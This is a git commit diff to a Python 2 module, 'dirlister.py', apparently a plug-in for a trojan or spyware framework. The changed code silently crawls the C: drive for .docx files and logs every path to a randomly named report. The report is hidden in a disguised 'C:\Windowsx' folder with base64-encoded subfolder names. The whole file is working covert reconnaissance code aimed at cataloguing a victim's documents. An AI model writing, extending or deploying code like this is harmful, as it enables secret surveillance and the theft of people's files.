4218e72df92a413c3cdaf0251606228043c371b2
PT <phuthong01@protonmail.com>
2018-08-09 21:08:34 +0700

    Adjusting dirlister

--- Mod/dirlister.py
+++ Mod/dirlister.py
@@ -1,60 +1,59 @@
-import os, datetime, random, fnmatch, threading, time
+import os, datetime, random, fnmatch, threading, time, Queue
 
-doc_path = ""
-directory_path = ""
 report_name = str(random.randint(1, 100000)) + '.txt'
 report_path = os.path.join('C:\\Windowsx\\aV9sdXZfdQ==\\anVzdGtpZGRpbmc=', report_name)
+path_queue = Queue.Queue()
+with open(report_path, 'a') as f:
+    f.write("\n" + str(datetime.datetime.now()) + "\n")
 
 
 def crawl_disk(disk, doc_type):
 
-    global doc_path
-    global directory_path
     global report_path
 
     for parent, directories, filenames in os.walk(disk):
         for filename in fnmatch.filter(filenames, "*%s" % doc_type):
-            doc_path += "%s" % str(os.path.join(parent, filename))
-
-        for directory in directories:
-            directory_path += "%s" % str(os.path.join(parent, directory))
-
-    with open(report_path, 'w') as f:
-        f.write("\n" + str(datetime.datetime.now()) + "\n")
-        f.write("\n" + str(doc_path) + "\n")
-        f.write("\n" + str(directory_path) + "\n")
+            doc_path = str(os.path.join(parent, filename))
+            path_queue.put(doc_path)
 
     print "Finish with disk %s" % disk
-    time.sleep(random.randint(1, 3))
+    time.sleep(random.randint(1, 5))
 
 
-def crawl_disk_with_lock(disk, doc_type, lock):
+def write_report():
 
-    lock.acquire()
-    crawl_disk(disk, doc_type)
-    lock.release()
+    global report_path
+
+    f = open(report_path, 'a')
+
+    while not path_queue.empty():
+        chunk = path_queue.get()
+        f.write("\n" + chunk + "\n")
+        print "Written to report: %s" % chunk
+
+    f.close()
+    time.sleep(5)
+
+    return
 
 
 def run(**args):
 
     print "[*] In dirlister module."
-    lock = threading.Lock()
-    doc_type = '.doc'
+    doc_type = '.docx'
     disk1 = 'C:\\'
-    disk2 = 'D:\\'
-    disk3 = 'E:\\'
 
-    t1 = threading.Thread(target=crawl_disk_with_lock, args=(disk1, doc_type, lock,))
-    t2 = threading.Thread(target=crawl_disk_with_lock, args=(disk2, doc_type, lock,))
-    t3 = threading.Thread(target=crawl_disk_with_lock, args=(disk3, doc_type, lock,))
-
+    # Scan disk 
+    t1 = threading.Thread(target=crawl_disk, args=(disk1, doc_type,))
     t1.start()
-    t2.start()
-    t3.start()
+
+    # If there are still threads in progress, keep writing the report
+    while t1.isAlive():
+        t2 = threading.Thread(target=write_report)
+        t2.start()
+        t2.join()
 
     t1.join()
-    t2.join()
-    t3.join()
 
     return
 
